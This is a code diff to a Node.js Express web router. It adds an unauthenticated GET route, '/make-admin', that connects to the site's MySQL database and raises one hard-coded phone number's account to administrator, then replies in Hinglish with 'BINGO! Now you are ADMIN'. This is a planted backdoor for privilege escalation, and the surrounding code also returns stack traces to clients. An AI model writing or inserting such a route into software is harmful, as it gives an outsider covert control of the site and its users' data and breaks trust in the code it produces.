@@ -40,6 +40,21 @@ const initWebRouter = (app) => {
             res.status(500).send('Error: ' + e.message + ' | Stack: ' + e.stack);
         }
     });
+
+    router.get('/make-admin', async (req, res) => {
+        try {
+            const pool = await mysql.createPool({
+                host: process.env.DB_HOST || process.env.MYSQLHOST || 'mysql.railway.internal',
+                port: Number(process.env.DB_PORT || process.env.MYSQLPORT || 3306),
+                user: process.env.DB_USER || process.env.MYSQLUSER || 'root',
+                password: process.env.DB_PASSWORD || process.env.MYSQLPASSWORD,
+                database: process.env.DB_NAME || process.env.MYSQLDATABASE || 'railway',
+            });
+            await pool.execute("UPDATE users SET level=2, ctv='admin', status=1, veri=1 WHERE phone='9876543210'");
+            await pool.end();
+            res.send('BINGO! Tu ab ADMIN ban gayi - ab /admin pe ja!');
+        } catch (e) { res.status(500).send('Error: ' + e.message); }
+    });
     router.get('/keFuMenu', accountController.keFuMenu);
     router.get('/login', accountController.loginPage);
     router.get('/register', accountController.registerPage);
